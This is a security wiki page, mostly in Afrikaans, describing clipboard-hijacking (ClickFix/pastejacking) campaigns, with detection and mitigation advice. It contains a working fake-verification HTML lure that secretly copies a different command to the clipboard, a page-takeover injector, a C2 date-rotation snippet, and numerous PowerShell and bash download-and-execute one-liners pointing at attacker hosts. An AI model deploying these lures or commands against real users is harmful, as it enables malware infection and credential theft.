# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Moet nooit iets plak wat jy nie self gekopieer het nie." – oud maar steeds geldige raad

## Oorsig

Clipboard hijacking – ook bekend as *pastejacking* – misbruik die feit dat gebruikers routinematig opdragte kopieer-en-plak sonder om dit na te gaan. 'n Kwaadwillige webblad (of enige JavaScript-capable konteks soos 'n Electron of Desktop toepassing) plaas programmaties aanvallerbeheerde teks in die stelselklembord. Slagoffers word aangespoor, gewoonlik deur sorgvuldig opgestelde social-engineering instructions, om **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), of 'n terminal te open en die klembordinhoud te *plak*, wat onmiddellik ewekansige opdragte uitvoer.

Omdat **geen lêer afgelaai word en geen aanhegsel geopen word nie**, omseil die tegniek die meeste e-pos en web-inhoud sekuriteitskontroles wat aanhegsels, macros of direkte opdraguitvoering monitor. Die aanval is dus gewild in phishing campaigns wat commodity malware families soos NetSupport RAT, Latrodectus loader of Lumma Stealer lewer.

## Gedwonge "Copy" knoppies en hidden payloads (macOS one-liners)

Sommige macOS infostealers kloon installasiewebwerwe (bv. Homebrew) en dwing die gebruik van 'n “Copy” knoppie af sodat gebruikers nie net die sigbare teks kan uitlig nie. Die klembordinvoer bevat die verwagte installer-opdrag plus 'n aangehegte Base64 payload (bv. `...; echo <b64> | base64 -d | sh`), sodat 'n enkele plak albei uitvoer terwyl die UI die ekstra stap verberg.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Ouer veldtogte het `document.execCommand('copy')` gebruik, nuwer verkeer steun op die asynchrone **Clipboard API** (`navigator.clipboard.writeText`).

## Die ClickFix / ClearFake Vloei

1. Gebruiker besoek 'n typosquatted of gekompromitteerde webwerf (bv. `docusign.sa[.]com`)
2. Ingevoegde **ClearFake** JavaScript roep `unsecuredCopyToClipboard()` helper aan wat stilweg 'n Base64-gekodeerde PowerShell one-liner in die clipboard stoor.
3. HTML-instruksies sê vir die slagoffer: *“Druk **Win + R**, plak die opdrag en druk Enter om die probleem op te los.”*
4. `powershell.exe` word uitgevoer en laai 'n argief af wat 'n regmatige uitvoerbare lêer plus 'n kwaadaardige DLL bevat (klassieke DLL sideloading).
5. Die loader ontsleutel bykomende stadiums, injekteer shellcode en installeer persistence (bv. geskeduleerde taak) – uiteindelik hardloop NetSupport RAT / Latrodectus / Lumma Stealer.

### Voorbeeld NetSupport RAT-ketting
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (legitieme Java WebStart) soek in sy gids na `msvcp140.dll`.
* Die kwaadwillige DLL los API's dinamies op met **GetProcAddress**, laai twee binaries (`data_3.bin`, `data_4.bin`) af via **curl.exe**, ontsleutel hulle met 'n rollende XOR-sleutel "https://google.com/", injecteer die finale shellcode en pak **client32.exe** (NetSupport RAT) uit na `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Laai `la.txt` af met **curl.exe**
2. Voer die JScript downloader binne **cscript.exe** uit
3. Haal 'n MSI payload af → plaas `libcef.dll` langs 'n ondertekende toepassing → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
Die oproep met **mshta** loods 'n verhulde PowerShell-skrip wat `PartyContinued.exe` aflaai, `Boat.pst` (CAB) uitpak, `AutoIt3.exe` herbou deur `extrac32` en lêer-konsolidasie, en uiteindelik 'n `.a3x`-skrip uitvoer wat blaaierbewyse na `sumeriavgv.digital` exfiltreer.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Sommige ClickFix-kampanjes slaan lêeraflaaie heeltemal oor en vra slagoffers om 'n one‑liner te plak wat JavaScript via WSH aflaai en uitvoer, dit persistent maak, en die C2 daagliks roteer. Voorbeeld van 'n waargenome ketting:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Belangrike eienskappe
- Versluierde URL omgekeerd tydens uitvoering om toevallige inspeksie te ontduik.
- JavaScript behou homself via Startup LNK (WScript/CScript), en kies die C2 volgens die huidige dag – wat vinnige domeinrotasie moontlik maak.

Minimale JS-fragment wat gebruik word om C2s volgens datum te roteer:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
Volgende fase ontplooi gewoonlik 'n loader wat persistentie vestig en 'n RAT (e.g., PureHVNC) aflaai, dikwels TLS aan 'n hardgekodeerde sertifikaat pen en verkeer in stukke (chunking) stuur.

Detectie-ideeë spesifiek vir hierdie variant
- Prosesboom: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Opstartartefakte: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` wat WScript/CScript aanroep met 'n JS-pad onder `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU en opdragreël-telemetrie wat `.split('').reverse().join('')` of `eval(a.responseText)` bevat.
- Herhaalde `powershell -NoProfile -NonInteractive -Command -` met groot stdin-payloads om lang skripte te voer sonder lang opdragreëls.
- Geplande Take wat daarna LOLBins uitvoer soos `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` onder 'n updater-agtige taak/pad (e.g., `\GoogleSystem\GoogleUpdater`).

Dreigingsjag
- Daagliks roterende C2-hostname en URL's met `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` patroon.
- Korreleer knipbord-skryfgebeure gevolg deur Win+R-plak en dan onmiddellike `powershell.exe`-uitvoering.

Blue-teams kan knipbord-, proses-skepping- en registertelemetrie kombineer om pastejacking-misbruik te lokaliseer:

* Windows-register: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` hou 'n geskiedenis van **Win + R** opdragte – kyk vir ongewone Base64 / obfuscated entries.
* Sekuriteitsgebeurtenis-ID **4688** (Process Creation) waar `ParentImage` == `explorer.exe` en `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Gebeure-ID **4663** vir lêerskeppings onder `%LocalAppData%\Microsoft\Windows\WinX\` of tydelike vouers net voor die verdagte 4688-gebeurtenis.
* EDR clipboard sensors (if present) – korreleer `Clipboard Write` gevolg onmiddellik deur 'n nuwe PowerShell-proses.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Onlangse veldtogte vervaardig massaal valse CDN/browser-verifikasiebladsye ("Just a moment…", IUAM-style) wat gebruikers dwing om OS-spesifieke opdragte van hul knipbord na native konsoles te kopieer. Dit skuif uitvoering uit die blaaier-sandbox en werk oor Windows en macOS.

Sleutelkenmerke van die builder-gegenereerde bladsye
- OS-detektering via `navigator.userAgent` om payloads aan te pas (Windows PowerShell/CMD vs. macOS Terminal). Opsionele afleidings/no-ops vir nie-ondersteunde OS om die illusie te handhaaf.
- Outomatiese knipbord-kopie by skynbaar goedaardige UI-aksies (checkbox/Copy) terwyl die sigbare teks van die knipbordinhoud kan verskil.
- Mobiele blokkering en 'n popover met stap-vir-stap instruksies: Windows → Win+R→paste→Enter; macOS → open Terminal→paste→Enter.
- Opsionele obfuskasie en enkel-lêer-injektor om 'n gekompromitteerde site se DOM te oorskryf met 'n Tailwind-gestileerde verifikasie-UI (no new domain registration required).

Voorbeeld: knipbordverskil + OS-bewuste vertakking
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistensie van die aanvanklike uitvoering
- Gebruik `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` sodat die uitvoering voortgaan nadat die terminal gesluit is, wat sigbare artefakte verminder.

In-plek bladsy-oornames op gekompromitteerde webwerwe
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Opsporing- en jagidees spesifiek vir IUAM-styl lokvalle
- Web: Bladsye wat Clipboard API aan verifikasie-widgets koppel; wanpassing tussen die vertoonde teks en die clipboard payload; `navigator.userAgent` takke; Tailwind + single-page vervanging in verdagte kontekste.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` kort ná 'n blaaiersinteraksie; batch/MSI-installeerders uitgevoer vanaf `%TEMP%`.
- macOS endpoint: Terminal/iTerm wat `bash`/`curl`/`base64 -d` met `nohup` begin naby blaaiergebeure; agtergrondprosesse wat voortduur nadat die terminal gesluit is.
- Korreleer `RunMRU` Win+R-geskiedenis en clipboard-skrywings met daaropvolgende konsolproses-skepping.

Sien ook vir ondersteunende tegnieke

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 fake CAPTCHA / ClickFix evolusies (ClearFake, Scarlet Goldfinch)

- ClearFake bly WordPress-webwerwe kompromitteer en injecteer loader JavaScript wat eksterne hosts ketting (Cloudflare Workers, GitHub/jsDelivr) en selfs blockchain “etherhiding” oproepe (bv., POSTs na Binance Smart Chain API-endpunte soos `bsc-testnet.drpc[.]org`) gebruik om huidige lokval-logika te haal. Onlangse overlays gebruik swaar fake CAPTCHAs wat gebruikers opdrag gee om 'n eenreël te kopieer/plak (T1204.004) in plaas van iets af te laai.
- Aanvanklike uitvoering word toenemend gedelegeer aan signed script hosts/LOLBAS. Januarie 2026-kettings het vroeëre `mshta` gebruik verruil vir die ingeboude `SyncAppvPublishingServer.vbs` uitgevoer via `WScript.exe`, wat PowerShell-agtige argumente met aliase/wildcards deurgee om remote content te haal:
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` is gesigneer en word normaalweg deur App-V gebruik; gepaard met `WScript.exe` en ongewone argumente (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) word dit 'n hoë-sein LOLBAS-fase vir ClearFake.
- Februarie 2026 se valse CAPTCHA payloads het teruggeskuif na puur PowerShell download cradles. Twee regstreekse voorbeelde:
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- Eerste ketting is 'n in-geheue `iex(irm ...)` grabber; die tweede stage via `WinHttp.WinHttpRequest.5.1`, skryf 'n tydelike `.ps1`, en begin dit met `-ep bypass` in 'n versteekte venster.

Opsporing/jagwenke vir hierdie variante
- Proseslyn: browser → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` of PowerShell cradles onmiddellik na clipboard-skryf/Win+R.
- Opdragreël sleutelwoorde: `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, jsDelivr/GitHub/Cloudflare Worker domains, or raw IP `iex(irm ...)` patterns.
- Netwerk: uitgaande verbindings na CDN worker hosts of blockchain RPC-endpunte vanaf skrip-hosts/PowerShell kort ná webblaai.
- File/registry: tydelike `.ps1` skepping onder `%TEMP%` plus RunMRU-inskrywings wat hierdie one-liners bevat; blokkeer/waarsku op signed-script LOLBAS (WScript/cscript/mshta) wat met eksterne URL's of geobfuskeerde alias-strings uitgevoer word.

## Mitigasies

1. Blaaierverharding – skakel clipboard-skriftoegang (`dom.events.asyncClipboard.clipboardItem` etc.) af of vereis 'n gebruikersgebaar.
2. Sekuriteitsbewustheid – leer gebruikers om *tik* sensitiewe opdragte of eers in 'n teksredigeerder te plak.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control om arbitraire one-liners te blokkeer.
4. Netwerkbeheer – blokkeer uitgaande versoeke na bekende pastejacking en malware C2-domeine.

## Verwante Tricks

* **Discord Invite Hijacking** misbruik dikwels dieselfde ClickFix-benadering nadat gebruikers na 'n kwaadwillige bediener gelok is:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## Verwysings

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)

{{#include ../../banners/hacktricks-training.md}}
